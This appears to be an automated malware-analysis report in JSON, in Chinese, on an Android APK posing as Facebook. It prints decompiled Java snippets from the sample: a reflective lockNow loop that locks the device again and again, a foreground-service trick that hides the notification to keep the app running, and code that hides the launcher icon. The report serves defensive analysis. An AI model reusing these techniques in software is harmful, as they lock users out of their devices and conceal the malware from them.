@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "17d1415176121aff8c0020c3a094b3d72f9802f5145c80ebca47dcfe10cc21f6.apk",
+    "sha256": "17d1415176121aff8c0020c3a094b3d72f9802f5145c80ebca47dcfe10cc21f6",
+    "包名": "gfdg.qwe.gsdg",
+    "应用名": "Facebook",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 245.0
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a;",
+          "method_signature": "if(i2 >= 70)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "while (true) { if (i2 >= 70) { return; } systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]); Thread.sleep(99L); i = i2 + 1; }",
+          "malicious_code_snippet_context": "while (true) { if (i2 >= 70) { return; } systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]); Thread.sleep(99L); i = i2 + 1; }",
+          "behavior_description": "该代码在后台线程中循环70次，每次通过Java反射调用系统服务（DevicePolicyManager）的lockNow()方法立即锁定设备屏幕，每次间隔仅99毫秒。即使用户尝试解锁，屏幕也会被立即再次锁定，导致设备完全无法使用，属于典型的勒索软件设备锁定（device lock）行为。数据流向：systemService（通过getSystemService获取的DevicePolicyManager实例）→ 反射调用 lockNow() 反复锁屏，阻断用户正常使用设备。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\das\\hfCancelNoticeService;",
+          "method_signature": "if(Build.VERSION.SDK_INT > 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT > 18) {\n    Notification.Builder builder = new Notification.Builder(this);\n    builder.setSmallIcon(R.mipmap.icon);\n    startForeground(vgMainService.a, builder.build());\n    new Thread(new Runnable() {\n        public void run() {\n            hfCancelNoticeService.this.a();\n            ((NotificationManager) hfCancelNoticeService.this.getSystemService(\"notification\")).cancel(vgMainService.a);\n            hfCancelNoticeService.this.stopSelf();\n        }\n    }).start();\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.app.Service\n      public int onStartCommand(Intent intent, int i, int i2) {\n>>>         if (Build.VERSION.SDK_INT > 18) {\n>>>             Notification.Builder builder = new Notification.Builder(this);\n>>>             builder.setSmallIcon(R.mipmap.icon);\n>>>             startForeground(vgMainService.a, builder.build());\n>>>             new Thread(new Runnable() { // from class: com.das.hfCancelNoticeService.1\n>>>                 @Override // java.lang.Runnable\n>>>                 public void run() {\n>>>                     try {\n>>>                         hfCancelNoticeService.this.a();\n>>>                         ((NotificationManager) hfCancelNoticeService.this.getSystemService(\"notification\")).cancel(vgMainService.a);\n>>>                         hfCancelNoticeService.this.stopSelf();\n>>>                     } catch (Exception e) {\n                          e.printStackTrace();\n                      }\n                  }",
+          "behavior_description": "该服务实现了经典的'前台服务通知取消'隐蔽保活技巧：onStartCommand 中判断 Build.VERSION.SDK_INT > 18 后，调用 startForeground(vgMainService.a, builder.build()) 将服务提升为前台服务（与主服务 vgMainService 共用同一通知 ID），使进程获得高优先级、避免被系统内存回收机制杀死；随后在新线程中执行 a() 并立即通过 NotificationManager.cancel(vgMainService.a) 撤销通知、stopSelf() 结束自身。数据流向为：系统版本判断与主服务通知 ID（source）→ startForeground 提升进程优先级 + cancel 取消通知抹除可见痕迹（sink）。最终效果是主恶意服务 vgMainService 在用户完全无感知（状态栏无任何通知图标）的情况下以前台优先级持续驻留运行，为 XLoader 间谍软件/银行木马提供隐蔽的持久化保活保障，属于恶意样本中的对抗性驻留机制而非正常业务的前台服务。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\rwe\\gsActivity;",
+          "method_signature": "run()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);",
+          "malicious_code_snippet_context": "              @Override // java.lang.Runnable\n              public void run() {\n                  try {\n>>>                     gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                  }",
+          "behavior_description": "在主 Activity 的 onCreate() 中，通过匿名 Runnable 的 run() 方法立即调用 PackageManager.setComponentEnabledSetting()，将应用自身主 Activity 组件状态设置为 2（COMPONENT_ENABLED_STATE_DISABLED），使应用图标从桌面启动器中消失，且参数 1（DONT_KILL_APP）保证进程不被杀死、恶意逻辑继续后台运行。数据流向：getPackageName()/gsActivity.class.getName()（获取自身组件名）→ setComponentEnabledSetting(componentName, 2, 1)（禁用组件以隐藏图标）。此外 onCreate 中还注册了设备管理器 rtAdminReceiver，与图标隐藏配合，进一步阻止用户发现和卸载应用。该行为是 XLoader（ANDROIDOS_XLOADER.HRX）银行木马/间谍软件的典型伪装与驻留手段，属于明确恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
